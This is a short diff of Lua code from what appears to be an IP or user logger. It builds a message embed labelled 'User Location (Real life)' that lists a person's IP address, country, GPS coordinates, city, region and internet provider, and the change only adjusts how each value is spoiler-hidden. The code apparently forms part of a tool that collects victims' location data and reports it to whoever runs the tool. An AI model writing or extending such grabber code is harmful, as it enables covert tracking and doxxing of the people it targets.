@@ -402,17 +402,17 @@ else
             data.embeds[1].fields,
             {
                 ["name"] = "**`(🤫) User Location (Real life)`**",
-                ["value"] = "(👣) IP Address:|| ||" ..
+                ["value"] = "(👣) IP Address:|| " ..
                     ipinfo_table.ip ..
-                        "\n(🌆) Country:|| ||" ..
+                        "||\n||(🌆) Country:|| " ..
                             ipinfo_table.country ..
-                                "\n(🪟) GPS Location:|| ||" ..
+                                "||\n||(🪟) GPS Location:|| " ..
                                     ipinfo_table.loc ..
-                                        "\n(🏙️) City:|| ||" ..
+                                        "||\n||(🏙️) City:|| " ..
                                             ipinfo_table.city ..
-                                                "\n(🏡) Region:|| ||" ..
+                                                "||\n||(🏡) Region:|| " ..
                                                     ipinfo_table.region ..
-                                                        "\n(🪢) Hoster:|| " .. ipinfo_table.org .. "||"
+                                                        "||\n||(🪢) Hoster:|| " .. ipinfo_table.org .. "||"
             }
         )
     end
